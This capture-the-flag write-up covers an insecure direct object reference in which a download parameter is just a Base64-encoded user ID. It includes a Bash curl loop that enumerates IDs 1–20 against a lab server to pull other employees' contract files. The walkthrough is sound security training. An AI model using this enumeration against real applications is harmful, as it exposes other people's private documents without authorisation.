# 🛡️ Challenge Write-Up: Download Hidden Employee Contracts (Web Exploitation)
## 🔍 Challenge Summary
The objective was to download employee contract files for user IDs 1 to 20 and extract a hidden flag from one of them. 
The application used a parameter named contract in a request to /download.php, which appeared to be encoded.
## 🧠 Initial Analysis
Inspecting the web application’s JavaScript revealed the following function:
```bash
 <script>
    function downloadContract(uid) {
      window.location = `/download.php?contract=${encodeURIComponent(btoa(uid))}`;
    }
  </script>
```
Let's breakdown the above function:

- `downloadContract(uid)` : A function that takes a user ID (`uid`) as a parameter.
- `btoa(uid)` : Base64-encodes the UID. `btoa()` stands for binary to ASCII, commonly used to encode strings in Base64.
- `encodeURIComponent(...)` : Ensures the Base64 string is URL-safe by encoding any special characters (like `+`, `/`, `=`).
- `/download.php?contract=...` : Constructs a URL where the `contract` parameter contains the Base64-encoded UID.
- `window.location` = ... : Redirects the browser to the new URL, effectively making a GET request to download the contract file.

If we use uid =1 then this will be
- The uid is 1 (a number), but btoa() expects a string, so JavaScript automatically converts it:
  ```bash
  btoa("1") → "MQ=="
  ```
- URL Encode the Base64:
  ```bash
  encodeURIComponent("MQ==") → "MQ%3D%3D"

```
- Then the browser is redirected to:
```bash
/download.php?contract=MQ%3D%3D
```

This is what happened when I clicked on the file name intercepting on BurpSuite.
![image](https://github.com/user-attachments/assets/234eab05-ceea-4a61-a141-93b663eb0422)

## ⚙️ Automation with Bash
To automate the contract file download and mapping for UIDs 1–20, I wrote a Bash script:
```bash
  GNU nano 8.2                                                                                                       bic.sh                                                                                                                
#!/bin/bash

url="http://83.136.251.68:47200/download.php"

# Print table header
printf "%-5s | %-15s | %-40s\n" "UID" "Base64" "Filename"
echo "----------------------------------------------------------------------"

for uid in {1..20}; do
    encoded=$(echo -n "$uid" | base64)

    # Perform the download and capture headers
    response_headers=$(curl -sOJ -D - "$url?contract=$encoded" -o /dev/null)

    # Extract filename from Content-Disposition header
    filename=$(echo "$response_headers" | grep -oP 'filename=\K[^;]+')

    # Print row
    printf "%-5s | %-15s | %-40s\n" "$uid" "$encoded" "$filename"
done
```
![image](https://github.com/user-attachments/assets/1812122e-2baa-47ee-b830-9e7d225865c4)

I manually checked each file using:
```bash
cat contract_<hash>.pdf
```
![image](https://github.com/user-attachments/assets/ea770263-7e84-493d-a5b7-cf28179a5cf0)

## 🏁 Flag Found!
One of the contract files contained the hidden flag, which confirmed successful exploitation and automation of the download process.
